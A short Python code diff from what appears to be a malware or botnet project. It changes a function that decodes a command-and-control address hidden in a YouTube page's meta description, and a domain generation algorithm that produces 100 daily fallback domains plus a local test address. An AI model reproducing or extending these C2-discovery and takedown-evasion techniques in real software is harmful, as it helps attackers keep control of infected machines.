@@ -11,7 +11,7 @@ def get_cnc_from_youtube():
     yt_page = BeautifulSoup(response.content, "html.parser")
     b64_encoded_url = yt_page.find("meta",{"name":"description"})
     if b64_encoded_url:
-        return b64decode(b64_encoded_url["content"]).decode()
+        return [b64decode(b64_encoded_url["content"]).decode()]
 
 # https://github.com/baderj/domain_generation_algorithms/tree/master/proslikefan
 def dga(date, magic, offset=1, tlds = ["me"]):
@@ -39,6 +39,6 @@ def generate_domains():
     if not domain:
         date = date.today()
         magic = "Wubba Lubba Dub Dub"
-        domains = [dga(date, magic, offset) for offset in range(100)]
-        return domains
-    return [domain]
+        domain = [dga(date, magic, offset) for offset in range(100)]
+    domain.append("localhost:5000")
+    return domain
